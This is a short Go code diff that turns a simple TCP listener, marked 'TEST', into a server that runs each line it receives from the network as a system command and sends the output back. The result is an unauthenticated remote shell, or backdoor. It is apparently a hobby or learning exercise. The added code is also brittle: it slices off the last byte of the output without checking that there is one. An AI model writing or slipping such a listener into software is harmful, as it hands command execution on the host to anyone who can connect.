@@ -5,16 +5,17 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"os/exec"
+	"strings"
 )
 
 // TEST
 func Server(serverPort string) {
+	// We prepare parameters to establish connection
 	fmt.Println("Hello from server")
 	sPort := ":" + serverPort
-	fmt.Println("sPort:", sPort)
 	tcpAddr, err := net.ResolveTCPAddr("tcp", sPort)
 	CheckError(err)
-	fmt.Println("TCPAddr:", tcpAddr)
 	listener, err := net.ListenTCP("tcp", tcpAddr)
 	CheckError(err)
 
@@ -26,7 +27,7 @@ func Server(serverPort string) {
 		fmt.Println("Server is listening")
 
 		r := bufio.NewReader(conn)
-	Loop:
+	Loop: // We read, exec the command and send the output
 		for {
 			line, err := r.ReadBytes(byte('\n'))
 			switch err {
@@ -37,7 +38,13 @@ func Server(serverPort string) {
 			default:
 				fmt.Println("ERROR", err)
 			}
-			fmt.Println(string(line))
+			fmt.Printf("%s", string(line))
+			out, err := exec.Command(strings.Trim(string(line), "\n")).Output()
+			out = out[:len(out)-1]
+			out = append(out, []byte("\r")...)
+			fmt.Printf("%s", out)
+			fmt.Println(out)
+			conn.Write(out)
 		}
 	}
 }
